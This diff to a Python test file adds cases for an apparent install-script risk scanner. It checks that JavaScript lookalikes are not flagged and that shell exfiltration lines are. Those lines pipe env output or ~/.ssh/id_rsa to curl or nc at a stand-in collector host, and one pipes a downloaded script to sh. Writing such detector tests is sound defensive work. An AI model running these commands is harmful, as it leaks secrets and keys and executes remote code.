@@ -138,6 +138,27 @@ class PythonInstallScriptTests(unittest.TestCase):
             "import urllib.request\nurllib.request.urlretrieve('https://files.invalid/x.tgz', 'x')\n"), [])
 
 
+class ShellRiskPrecisionTests(unittest.TestCase):
+    """Shell network/environment patterns must not fire on ordinary JS."""
+
+    def test_js_lookalikes_are_not_network_or_env(self):
+        for text in ("var nc = 1;\nconst body = JSON.stringify(process.env);\n",
+                     "function f(env) {\n  return env\n}\nfetch('https://registry.npmjs.org/x')\n",
+                     "const curl = require('./curl');\nObject.keys(process.env);\n",
+                     "env || true\ncurl -O https://files.invalid/x.tgz\n"):
+            with self.subTest(text=text[:30]):
+                self.assertEqual(repo.install_script_risk(text), [])
+
+    def test_shell_exfiltration_shapes(self):
+        for text in ("env | curl -s -X POST --data-binary @- https://collector.invalid/x\n",
+                     "printenv > /tmp/e; curl -d @/tmp/e https://collector.invalid\n",
+                     "cat ~/.ssh/id_rsa | nc collector.invalid 4444\n",
+                     "curl --data \"$(env)\" -X POST https://collector.invalid\n",
+                     "curl -s https://collector.invalid/x.sh | sh\n"):
+            with self.subTest(text=text[:30]):
+                self.assertTrue(repo.install_script_risk(text))
+
+
 class TestPathTests(unittest.TestCase):
     BLOB = "const p = '" + "QUJD" * 150 + "';\n"
 
